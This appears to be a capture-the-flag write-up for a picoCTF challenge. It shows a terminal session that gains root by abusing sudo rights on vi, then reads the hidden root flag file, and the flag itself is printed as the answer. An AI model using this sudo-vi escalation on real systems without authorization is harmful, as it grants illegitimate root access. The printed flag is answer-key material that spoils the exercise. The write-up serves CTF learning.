#### - **Descripción** 
¿Puedes leer archivos en el archivo raíz?

Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 55354 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?
**Pista**
¿Que permisos tienes?

#### - **Solución** 
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi test

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# ls
root@challenge:/home/picoplayer# ls -la
total 28
drwxr-xr-x 1 picoplayer picoplayer    58 Feb 22 03:47 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
-rw------- 1 picoplayer picoplayer    52 Feb 22 03:45 .bash_history
-rw-r--r-- 1 picoplayer picoplayer   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer  3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer    34 Feb 22 03:38 .cache
-rw-r--r-- 1 picoplayer picoplayer   807 Feb 25  2020 .profile
-rw------- 1 root       root       12288 Feb 22 03:47 .test.swp
root@challenge:/home/picoplayer# cat . 
./             ../            .bash_history  .bash_logout   .bashrc        .cache/        .profile       .test.swp      
root@challenge:/home/picoplayer# cat .test.swp 
3210#"! Utpadroot@challenge:/home/picoplayer# cd /root
root@challenge:~# ll
total 20
drwx------ 1 root root   43 Feb 22 03:45 ./
drwxr-xr-x 1 root root   75 Feb 22 03:45 ../
-rw------- 1 root root   60 Feb 22 03:45 .bash_history
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  768 Feb 22 03:45 .viminfo
root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
root@challenge:~# 

picoCTF{uS1ng_v1m_3dit0r_ad091ce1}